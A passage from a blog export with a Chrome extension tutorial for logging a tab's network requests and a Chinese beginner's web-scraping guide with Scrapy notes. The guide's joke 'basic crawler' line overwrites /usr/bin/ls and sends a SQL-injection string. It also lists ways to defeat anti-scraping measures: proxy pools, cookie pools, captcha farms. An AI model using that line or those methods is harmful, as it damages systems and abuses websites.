<div class="code-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">onEvent</span>(<span class="params">debuggeeId, message, params</span>) &#123;</span><br><span class="line">  <span class="keyword">if</span> (tabId != debuggeeId.<span class="property">tabId</span>)</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (message == <span class="string">&quot;Network.requestWillBeSent&quot;</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> requestDiv = requests[params.<span class="property">requestId</span>];</span><br><span class="line">    <span class="keyword">if</span> (!requestDiv) &#123;</span><br><span class="line">      <span class="keyword">var</span> requestDiv = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&quot;div&quot;</span>);</span><br><span class="line">      requestDiv.<span class="property">className</span> = <span class="string">&quot;request&quot;</span>;</span><br><span class="line">      requests[params.<span class="property">requestId</span>] = requestDiv;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    chrome.<span class="property">tabs</span>.<span class="title function_">query</span>(&#123;<span class="string">&#x27;active&#x27;</span>: <span class="literal">true</span>, <span class="string">&#x27;lastFocusedWindow&#x27;</span>: <span class="literal">true</span>&#125;, <span class="keyword">function</span> (<span class="params">tabs</span>) &#123;</span><br><span class="line">      <span class="comment">// get the function code</span></span><br><span class="line">      <span class="keyword">var</span> tabUrl = tabs[<span class="number">0</span>].<span class="property">url</span>;</span><br><span class="line">      <span class="keyword">const</span> urlPaths = <span class="title function_">parseURL</span>(tabUrl).<span class="property">fragment</span>.<span class="title function_">split</span>(<span class="string">&quot;/&quot;</span>);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">const</span> functionCode = urlPaths[<span class="number">3</span>].<span class="title function_">toUpperCase</span>() || urlPaths[<span class="number">2</span>].<span class="title function_">toUpperCase</span>();</span><br><span class="line"></span><br><span class="line">      <span class="comment">// existRequest[tabUrl] = parseURL(params.request.url).path;</span></span><br><span class="line">      <span class="comment">// trim the requests and format them to request object which got two attributes: method &amp; url</span></span><br><span class="line">      <span class="keyword">const</span> requestUrlWithArgs = <span class="title function_">parseURL</span>(params.<span class="property">request</span>.<span class="property">url</span>).<span class="property">path</span>;</span><br><span class="line">      <span class="keyword">let</span> requestUrl = requestUrlWithArgs;</span><br><span class="line">      <span class="keyword">if</span>(requestUrlWithArgs.<span class="title function_">indexOf</span>(<span class="string">&quot;?&quot;</span>) != -<span class="number">1</span>)&#123;</span><br><span class="line">        requestUrl = requestUrlWithArgs.<span class="title function_">split</span>(<span class="string">&quot;?&quot;</span>)[<span class="number">0</span>];</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="comment">//valid url not request for css, js, etc ...</span></span><br><span class="line">      <span class="keyword">if</span>(<span class="title function_">indexOfArray</span>(fileUrls, requestUrl)) &#123;</span><br><span class="line">        <span class="keyword">return</span> ;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">// format number to &#123;id&#125;, a2-b0-cq to &#123;oid&#125;, and a_z to &#123;code&#125;</span></span><br><span class="line">      <span class="keyword">let</span> requestObject = &#123;&#125;;</span><br><span class="line">      requestObject.<span class="property">method</span> = params.<span class="property">request</span>.<span class="property">method</span>;</span><br><span class="line">      requestObject.<span class="property">url</span> = <span class="title function_">formatUrl</span>(requestUrl);</span><br><span class="line"></span><br><span class="line">      <span class="comment">// create such a struct: include key &amp; value which key is function code and value is a list contanis unique requests </span></span><br><span class="line">      <span class="title function_">pushIfNotPresent</span>(existRequest, functionCode, requestObject, </span><br><span class="line">        <span class="function">(<span class="params">src, dest</span>) =&gt;</span> &#123; <span class="keyword">return</span> src.<span class="property">method</span> === dest.<span class="property">method</span> &amp;&amp; src.<span class="property">url</span> === dest.<span class="property">url</span>; &#125;);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">var</span> requestLine = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&quot;pre&quot;</span>);</span><br><span class="line">      requestLine.<span class="property">textContent</span> = <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(existRequest, <span class="literal">null</span>, <span class="number">4</span>);</span><br><span class="line">      requestDiv.<span class="title function_">appendChild</span>(requestLine);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">const</span> containerNode = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;container&quot;</span>);</span><br><span class="line">      <span class="keyword">while</span> (containerNode.<span class="property">firstChild</span>) &#123;</span><br><span class="line">        containerNode.<span class="title function_">removeChild</span>(containerNode.<span class="property">firstChild</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      containerNode.<span class="title function_">appendChild</span>(requestDiv);</span><br><span class="line">    &#125;);</span><br><span class="line">    </span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<ul>
<li>附一张截图</li>
</ul>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://raw.githubusercontent.com/ReZeroS/request-record/master/json.png"
                      alt="插件样例图"
                ></p>
<h2 id="推荐查询手册"><a href="#推荐查询手册" class="headerlink" title="推荐查询手册"></a>推荐查询手册</h2><p><a class="link"   href="https://developer.chrome.com/extensions/api_index" >Chrome 插件API文档<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p><a class="link"   href="https://chromedevtools.github.io/devtools-protocol/tot/Debugger" >Chrome 开发协议相关<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<h2 id="懒推广"><a href="#懒推广" class="headerlink" title="懒推广"></a>懒推广</h2><p>插件怎么写都说了，以后应该也不会写类似的文章，这里就顺便说下我自己用的一些插件，老实说并不常用，但是偶尔用上就莫名被爽到。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://raw.githubusercontent.com/ReZeroS/request-record/master/%E6%89%B9%E6%B3%A8%202020-03-07%20140017.png"
                      alt="chrome 插件"
                ></p>
<p><a class="link"   href="https://github.com/ReZeroS/request-record" >https://github.com/ReZeroS/request-record<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<h2 id="This-post-is-used-to-explain-how-to-write-the-plugin-request-record"><a href="#This-post-is-used-to-explain-how-to-write-the-plugin-request-record" class="headerlink" title="This post is used to explain how to write the plugin: request-record."></a>This post is used to explain how to write the plugin: request-record.</h2><p>I got a mission this week to record all api from function requests in our system. I have finished it, but I still wanna to write a plugin to simplify this work. Well, it maybe does not work well, so just write for fun.</p>
<h3 id="First-step-bulid-the-setting"><a href="#First-step-bulid-the-setting" class="headerlink" title="First step: bulid the setting"></a>First step: bulid the setting</h3><p>Most project should be included a setting file which is used to describe the whole project base setting such like common properties, version number, etc…</p>
<p>Chrome extension got this file called <code>manifest.json</code>.</p>
<div class="code-container" data-rel="Json"><figure class="iseeu highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Request Record&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;description&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Generate the request log and group them by address url&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;version&quot;</span><span class="punctuation">:</span> <span class="string">&quot;0.1&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;permissions&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">    <span class="string">&quot;debugger&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="string">&quot;tabs&quot;</span></span><br><span class="line">  <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;background&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;scripts&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="string">&quot;background.js&quot;</span><span class="punctuation">]</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;browser_action&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;default_icon&quot;</span><span class="punctuation">:</span> <span class="string">&quot;icon.png&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;default_title&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Request Record&quot;</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;manifest_version&quot;</span><span class="punctuation">:</span> <span class="number">2</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure></div>

<p>The <code>permissions</code> field tells the permissions it required and <code>background</code> field tells the background scripts should be registered.<br>If u still don’t know what is the above mean, u can just write it down and skip this.</p>
<h3 id="Second-step-render-the-page"><a href="#Second-step-render-the-page" class="headerlink" title="Second step: render the page"></a>Second step: render the page</h3><p>Since we finished the first step, the only info we can infer to is the <code>background</code> field tell <code>background.js</code>, let’s write it.</p>
<div class="code-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line">chrome.<span class="property">browserAction</span>.<span class="property">onClicked</span>.<span class="title function_">addListener</span>(<span class="keyword">function</span>(<span class="params">tab</span>) &#123;</span><br><span class="line">  chrome.<span class="property">debugger</span>.<span class="title function_">attach</span>(&#123;<span class="attr">tabId</span>:tab.<span class="property">id</span>&#125;, version,</span><br><span class="line">      onAttach.<span class="title function_">bind</span>(<span class="literal">null</span>, tab.<span class="property">id</span>));</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> version = <span class="string">&quot;1.0&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">onAttach</span>(<span class="params">tabId</span>) &#123;</span><br><span class="line">  <span class="keyword">if</span> (chrome.<span class="property">runtime</span>.<span class="property">lastError</span>) &#123;</span><br><span class="line">    <span class="title function_">alert</span>(chrome.<span class="property">runtime</span>.<span class="property">lastError</span>.<span class="property">message</span>);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  chrome.<span class="property">windows</span>.<span class="title function_">create</span>(</span><br><span class="line">      &#123;<span class="attr">url</span>: <span class="string">&quot;headers.html?&quot;</span> + tabId, <span class="attr">type</span>: <span class="string">&quot;popup&quot;</span>, <span class="attr">width</span>: <span class="number">800</span>, <span class="attr">height</span>: <span class="number">600</span>&#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>Chrome support <code>chrome</code> object to provide the api for developer to access the browser. And u can see them all from <a class="link"   href="https://developer.chrome.com/extensions/api_index" >here<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>. The listener we registered will fire when a browser action icon is clicked while does not fire if the browser action has a popup. We use the listener to capture the tab and pass it to debugger which can attach to it to instrument network interaction, debug JavaScript, mutate the DOM and CSS, etc. Use the Debuggee tabId to target tabs with sendCommand and route events by tabId from onEvent callbacks.</p>
<p>After we bind the chrome tab we can write the real work code and got the error message at runtime.</p>
<h3 id="Third-step-build-the-app"><a href="#Third-step-build-the-app" class="headerlink" title="Third step: build the app"></a>Third step: build the app</h3><p>The follow template shows how to bind listener to the window we created last step and capture the web request.<br>The <code>Network.enable</code> varible which defined by the <a class="link"   href="https://chromedevtools.github.io/devtools-protocol/tot/Network" >remote debugging protocol<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> could enable network tracking, and then network events will be delivered to the client.</p>
<div class="code-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> tabId = <span class="built_in">parseInt</span>(<span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">search</span>.<span class="title function_">substring</span>(<span class="number">1</span>));</span><br><span class="line"></span><br><span class="line"><span class="variable language_">window</span>.<span class="title function_">addEventListener</span>(<span class="string">&quot;load&quot;</span>, <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">  chrome.<span class="property">debugger</span>.<span class="title function_">sendCommand</span>(&#123;<span class="attr">tabId</span>:tabId&#125;, <span class="string">&quot;Network.enable&quot;</span>);</span><br><span class="line">  chrome.<span class="property">debugger</span>.<span class="property">onEvent</span>.<span class="title function_">addListener</span>(onEvent);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">window</span>.<span class="title function_">addEventListener</span>(<span class="string">&quot;unload&quot;</span>, <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">  chrome.<span class="property">debugger</span>.<span class="title function_">detach</span>(&#123;<span class="attr">tabId</span>:tabId&#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></div>

<p><code>onEvent</code> function got three params: <code>debuggeeId, message, params</code>, u can use them to write what u want.</p>
<p>Here I wanna to record the request log, so I intercept at the <code>requestWillBeSent</code>, and get the request from the params, get the tab url by using <code>chrome.tabs.query</code>.</p>
<h3 id="Last-step-load-your-package"><a href="#Last-step-load-your-package" class="headerlink" title="Last step: load your package"></a>Last step: load your package</h3><p>After last three steps, we can open the extension tab and load from unzip folder which we created, then u can see it.</p>
]]></content>
      <categories>
        <category>前端</category>
      </categories>
      <tags>
        <tag>FrontDesign</tag>
        <tag>Chrome</tag>
        <tag>Plugins</tag>
      </tags>
  </entry>
  <entry>
    <title>如何写一个简易的爬虫</title>
    <url>/2020/03/08/init-spider/</url>
    <content><![CDATA[<h1 id="如何写一个简易的爬虫"><a href="#如何写一个简易的爬虫" class="headerlink" title="如何写一个简易的爬虫"></a>如何写一个简易的爬虫</h1><h2 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h2><h3 id="有言在先"><a href="#有言在先" class="headerlink" title="有言在先"></a>有言在先</h3><p>本文只是新手文，望各位指正</p>
<blockquote>
<p>本文图片之类链接打不开，可直接科学上网走外链，参考 <a class="link"   href="https://qqtim.club/2020/03/08/init-spider/" >原博文<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
</blockquote>
<h3 id="啥是爬虫"><a href="#啥是爬虫" class="headerlink" title="啥是爬虫"></a>啥是爬虫</h3><p>按一定规则，遵循协议实现的请求模拟接口。</p>
<h3 id="学会爬虫的好处"><a href="#学会爬虫的好处" class="headerlink" title="学会爬虫的好处"></a>学会爬虫的好处</h3><ol>
<li>了解一些法律常识</li>
<li>吃牢饭</li>
<li>学习 <code>web</code> 相关的基础知识</li>
</ol>
<h3 id="推荐阅读"><a href="#推荐阅读" class="headerlink" title="推荐阅读"></a>推荐阅读</h3><p><a class="link"   href="https://en.wikipedia.org/wiki/Robots_exclusion_standard" >robots 协议<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p><a class="link"   href="https://2.python-requests.org/en/master/" >Requests 官网文档<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p><a class="link"   href="https://cuiqingcai.com/" >大才哥的 Blog<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p><a class="link"   href="https://scrapy.org/" >Scrapy 官网文档<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<h3 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h3><div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;/usr/bin/ls&#x27;</span>, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(parse(request.get(<span class="string">&quot;http://api.com?id=1&#x27; or 1=&#x27;1)))</span></span><br></pre></td></tr></table></figure></div>

<p>上面是一个基础爬虫的所有内容，包括了请求，解析处理以及数据的持久化, 毫无疑问这种爬虫不够快，我们给他改装下，用上多进程和异步协程（python的多线程有全局锁，所以用起来可以说是食之无味），这里推荐阅读 <a class="link"   href="https://cuiqingcai.com/6160.html" >Python 异步协程和多进程使用<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<hr>
<p>多进程协程知识扩展： PENDING</p>
<hr>
<p>改装过后的爬虫速度上去了，但是不够健壮，爬虫的基本目标数据锁定好后，剩下的工作几乎都是为了让爬虫能够稳定的爬取这些数据，也就是说我们需要应对反爬来制定反反爬策略。</p>
<h3 id="相关技能要求"><a href="#相关技能要求" class="headerlink" title="相关技能要求"></a>相关技能要求</h3><ol>
<li><p>一般来说目标数据会有两种存在方式，一种是数据直接清晰的描述在 <code>response</code> 中，这种多见于现行的前后端分离模式，该模式下后端往往提供纯数据的接口供前端渲染。 也有另一种方式，就是模板引擎之类直接渲染在页面上的，这类多是采用解析 <code>element</code> 对页面进行格式化处理来采摘需要的数据。针对前者没什么好说的，后者就要求至少掌握一种 <code>element</code> 的解析方式，这里推荐两种，一种是语义化比较舒服的 <code>bs4</code>, 另一种相对前者略高一点学习成本，有点类似正则自然也具有很高效率的 <code>xpath</code>。</p>
</li>
<li><p>至少了解一种持久化的方式，数据爬取后一般都是要存储的，写文件也好，存关系或非关系型数据库也好，总要有种持久化的方式</p>
</li>
<li><p>了解一点你所使用语言的性能相关的知识，爬虫毕竟通常是用来采集大量的数据的，如果没有好的性能，效率堪忧不说，也对反爬方的识别提供了充裕的时间。当然这点并非绝对，纯粹的过快的采集也极易被封杀。</p>
</li>
</ol>
<h3 id="常见反爬和反反爬策略"><a href="#常见反爬和反反爬策略" class="headerlink" title="常见反爬和反反爬策略"></a>常见反爬和反反爬策略</h3><ol>
<li><p>先说最极端的情况，爬与反爬本来就是个道高魔高的问题，所以一定要把数据持久化，打好标记，做断点续传。</p>
</li>
<li><p>再说一个极端，反爬针对的是爬虫，所以大部分爬虫都是在模仿人的行为来迷惑目标网站。所以这期间就出了一个特类的爬虫，驱动型爬虫，简单说就是控制浏览器行为模仿人的行为来操作，该方法大多数情况下直接绕过了各类网站做的层出不穷的鉴权操作，这方面推荐的了解是 <code>Chrome Headless， Selenium</code>（很多自动化测试也采用此方法） 此方法过为霸道，霸道总是会有奇效，但此文不做阐述</p>
</li>
<li><p><code>header</code> 的重要性。<code>http</code> 协议的 <code>request</code> 基本分为三部分， <code>start line</code>, <code>header</code>, <code>body</code> 三部分中body往往封装业务数据作为请求体，<code>start line</code> 几乎是必要的基本信息，那么剩下的 <code>header</code> 部分，就是最适合做验证的地方，对爬虫来说，很重要的一点就是模拟请求，而模拟请求的难点就是 <code>header</code> 的构造。如果全量模拟请求的 <code>header</code>, 那基本得到的就是相同的响应</p>
<ul>
<li><p>最基本的反爬操作就是使用随机的 <code>User-Agent</code> 来进行访问，基本两种最为适用，一种是通用的浏览器 <code>User-Agent</code>，另一种是常见的搜索引擎 <code>User-Agent</code>。 看起来后者更有效，其实不然，只需要反爬方简单的<code>nslookup</code> 下几乎一个正则就能判定真伪。而前者才是更通用的选择，毕竟用户就是用的这些通用浏览器。此外有些爬虫可能在 <code>PC</code> 端不好爬，可以通过更换该属性切换另个平台比如手机端进行尝试，有可能有奇效。</p>
</li>
<li><p><code>Cookie</code>， 这个就是过鉴权的方式之一，传统的 <code>web</code> 应用往往基于 <code>Cookie</code> 来存放验证信息，所以爬虫方只要获取一个活性 <code>Cookie</code> 就可以，而为了维护 <code>Cookie</code> 的有效性, 可以考虑去维护一个 <code>Cookie</code> 池，定期取用活性的 <code>Cookie</code>， 清理或刷新失效的 <code>Cookie</code>。</p>
</li>
<li><p><code>Referer</code>，溯源链接，带上就好</p>
</li>
</ul>
</li>
<li><p><code>CSS</code>，反反爬的一个难点 。对于解析页面，审查元素是最常用的定位技能，然而用户看到的数据，和定位的元素未必是同一个数据，这点可以利用 <code>css</code> 的一些方法来实现 trick（比如元素偏移，伪元素，字符集替换等），这里列举几篇文章：<a class="link"   href="https://zhuanlan.zhihu.com/p/84426202" >CSS 反爬<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>，<a class="link"   href="https://msd.misuland.com/pd/3643782633961297332?page=1" >CSS 隐藏式<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>，<a class="link"   href="https://zhuanlan.zhihu.com/p/60377927" >自如反爬<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> ，<a class="link"   href="https://cuiqingcai.com/8648.html" >SVG 反爬<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> 有兴趣的可以自加搜索。</p>
</li>
<li><p><strong>IP 限频</strong>。其实封 <code>IP</code> 这种事应该是一种AOE式攻击，可能效果非常显著，但是误伤的几率也应该很大。所以这个没啥好说的，自己从网上找几个免费代理网站，爬下来维护个 <code>IP</code> 池(这其实和前面的刷 <code>Cookie</code>, <code>User-Agent</code> 效果是一样的)，随机取出来能用的作为活性代理即可。这种方法弊端很明显，免费的代理大家都清楚，不稳定，慢，gg 的快，所以除此之外还有一种骚操作，就是 <a href="https://cuiqingcai.com/3443.html"><code>ADSL</code> 拨号</a>，通过拨号上网，既能保障稳定的速度，又能及时更换新的 <code>IP</code>。</p>
</li>
<li><p><strong>投毒蜜罐</strong>。 这个是我的知识盲区，试想你每次都打印你同学的实验报告，直到有一次被他发现，然后他就偷偷地在里面掺了一段小黄文。这能怎么办？如果商家返回的数据真的是进行了投毒，对数据进行了掺假，这发现了也许还有应对措施，但大多数情况下无法分辨是否有假数据。相对投毒，蜜罐更加直接，发现你是爬虫之后直接为你替换成假数据接口，甚至对你的行为模式进行分析，下次你再用相同的手段去爬取几乎就是难上加难了。</p>
</li>
<li><p><strong>验证码</strong>, 这个属于鉴权的一种吧。现在多是采用两种应对模式，一种就是找样例数据，打<code>tag</code>，自己去训练模型，对验证码进行识别。另一种就简单暴力，人工打码，上了年纪的人应该都听说过一种兼职叫 刷单，打码平台也是这个道理，他会召集一些可能无聊的人，让他们人工式地去帮忙识别验证码，这种方法的好处是能应对任何人类可以破解的验证码（比如 12306 这种变态的验证），这种方式能想到的坏处就是人力资源可能会越来越贵，所以以后来说可能还是<a class="link"   href="https://www.lancaster.ac.uk/staff/wangz3/publications/ccs18.pdf" >前者可能性更高<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
</li>
<li><p><strong>SQL 注入</strong>, 有一说一，爬虫本来就是种注入手段（例如 <a class="link"   href="http://sqlmap.org/" >SqlMap<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>），所以对面说你先动的手你也没啥好委屈的。说到安全，不得不说，很多渗透或者攻击手段，其实都是直接或间接地利用了爬虫。比如常见的工具 <code>setoolkit</code> 中克隆站点的方式，通过爬取模拟目标网站，采用社会工程的方式去钓鱼，诱导用户。再比如批量构造子域名或访问路径，来猜测目标网站的后台地址，又或者拦截请求，直接修改参数进行暴力破解等。</p>
</li>
<li><p><strong>JS 加密混淆</strong>，反混淆工具推荐: <a class="link"   href="https://mindedsecurity.github.io/jstillery/" >JStillery<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
</li>
<li><p><strong>图片数据</strong>，将数据渲染成图片的形式返回响应。这个没有溯源的办法， 目前可行的都是做 <code>OCR</code> 识别</p>
</li>
</ol>
<h3 id="框架的推荐"><a href="#框架的推荐" class="headerlink" title="框架的推荐"></a>框架的推荐</h3><ol>
<li><p>如果只是写简单的爬虫，那么推荐 <code>requests</code> 搭配个 <code>bs4</code> 就够用了，整挺好</p>
</li>
<li><p>如果想用个成熟点的工具，那么就推荐一下 <code>scrapy</code> ，当然仍强烈推荐阅读<a class="link"   href="https://doc.scrapy.org/en/latest/topics/architecture.html" >官网文档<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>。</p>
</li>
</ol>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://doc.scrapy.org/en/latest/_images/scrapy_architecture_02.png"
                      alt="Scrapy"
                ></p>
<ul>
<li><p>初始化时核心部分 Engine 会从 Spider 处获取初始请求以开始作为整个流程的起点。</p>
</li>
<li><p>上述的请求会入队 Scheduler</p>
</li>
<li><p>Engine 真正取请求进行工作是从 Scheduler 获取的。</p>
</li>
<li><p>Engine 将请求发送到下载器。</p>
</li>
<li><p>请求完成后，Downloader 会生成一个响应结果并将其回复给 Engine。</p>
</li>
<li><p>Engine 接收响应，并将其发送到 Spider 进行处理</p>
</li>
<li><p>Spider 将响应处理成两部分，一部分是解析后的需要数据作为 Item 另一部分是新的请求。</p>
</li>
<li><p>Engine 将处理后的 Item 发送到 Item Pipelines，然后将处理后的请求发送到 Scheduler。</p>
</li>
<li><p>重复上述整个流程，直到 Scheduler 无新的请求为止。</p>
</li>
</ul>
<p>其实图片已经描述的很清楚了，这里只是复述了一遍。总体来说框架的结构还是很通俗易懂的，这里有两个特殊的中间件需要关注下：一个是 Spider 和 Engine 的中间件，这个中间件主要可以用来做发起请求的 <code>post_process</code> 或者处理一些异常之类的；另一个中间件是下载器附近那个，这个可以用来过滤请求，或者改变回复响应之类的。</p>
<h3 id="闲话部分"><a href="#闲话部分" class="headerlink" title="闲话部分"></a>闲话部分</h3><p>前面介绍的大多是基于 <code>http</code> 协议的爬虫，但像是直播弹幕，聊天记录等等这些一般是通过 <code>websocket</code> 协议去实现的，这里其实道理都是一样的，也推荐篇文章 <a class="link"   href="http://www.itboth.com/d/VnUV3e/websocket" >弹幕爬取<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p>另外爬虫的实践也推荐一下，很有意思的分析 <a class="link"   href="https://zhuanlan.zhihu.com/p/40151702" >新浪微博模拟登录<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<h2 id="Scrapy-notes"><a href="#Scrapy-notes" class="headerlink" title="Scrapy notes"></a>Scrapy notes</h2><ol>
<li><p>scrapy startproject YourProjectName</p>
<pre><code>建立scrapy项目
</code></pre>
</li>
<li><p><strong>开始爬虫</strong> <code>scrapy crawl SpiderName</code> 开始执行爬虫 以上仿麻烦<br>根目录新建执行文件</p>
<pre><code>from scrapy.cmdline import execute
execute([&#39;scrapy&#39;, &#39;crawl&#39;, &#39;dingdian&#39;])
</code></pre>
<p>顶点为spider的name</p>
</li>
<li><p><strong>定义爬取的字段</strong> 就比如说爬小说<br>字段有 小说作者，小说内容等<br>Item文件下定义</p>
<pre><code>class DingdianItem(scrapy.Item):
    author = scrapy.Field()
    content = scrapy.Field()
</code></pre>
<p>如上，定义一定要继承Item<br>然后字段皆为Field()， 没有其他类型<br>比Django要方便的多</p>
</li>
<li><p><strong>开始写核心spider部分</strong> spider以start_requests为初始函数，该函数必须yield一个可迭代对象<br>比如Request(url, call_back, meta)<br>参数说明url，即需要Request.get 的内容，call_back是一个parse函数，该函数可接受一个由刚才的get获取的response, meta是由上一个Request往这传的时候可以带上的参数 parse 最终要yield 或 return 一个或多个 Item,来进行后续处理</p>
<h4 id="这里有个巨大的"><a href="#这里有个巨大的" class="headerlink" title="这里有个巨大的"></a>这里有个巨大的</h4><h2 id="坑："><a href="#坑：" class="headerlink" title="坑："></a><strong>坑</strong>：</h2><p><strong>response尽量一次处理，不要在多个parse之间执行，因为所有的url,但凡被Request过，不会被二次请求，简单来说，url通常不能为response.url,如果你跟我一样踩到这个坑，注意这个解决方法</strong></p>
</li>
</ol>
<blockquote>
<p>Scrapy的官方文档：<br><a class="link"   href="http://doc.scrapy.org/en/latest/topics/request-response.html#scrapy.http.Request" >http://doc.scrapy.org/en/latest/topics/request-response.html#scrapy.http.Request<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a><br>Request函数在文档中的定义：<br>class scrapy.http.Request(url[, callback, method&#x3D;’GET’, headers, body, cookies, meta, encoding&#x3D;’utf-8’, priority&#x3D;0, dont_filter&#x3D;False, errback])<br>在这儿， request的 dont_filter 设置为True就可以了</p>
</blockquote>
<ol>
<li><p>Item被收集完成后，进入pipeline,<br>这里就进行最后的处理了,可以将Item的内容提取出来，进行数据库等的存储<br>模板：</p>
<p>class DingdianPipeline(object):</p>
<pre><code>def process_item(self, item, spider):
    # deferToThread(self._process_item, item, spider
    if isinstance(item, DcontentItem):
        url = item[&#39;chapterurl&#39;]
        name_id = item[&#39;id_name&#39;]
        num_id = item[&#39;num&#39;]
        xs_chaptername = item[&#39;chaptername&#39;]
        xs_content = item[&#39;chaptercontent&#39;]
        Sql.insert_novel(name, content, name_id, num_id, url)
        print(&#39;小说存储完毕&#39;)
        return item
</code></pre>
</li>
</ol>
<p>def process_item(self, item, spider):该方法必须重写，且return item此外，此函数通常功能即为去重后存储</p>
]]></content>
      <categories>
        <category>爬虫</category>
      </categories>
      <tags>
        <tag>Sprider</tag>
        <tag>Basic knowledge</tag>
      </tags>
  </entry>
  <entry>
    <title>Java Lock</title>
    <url>/2020/08/12/java-lock/</url>
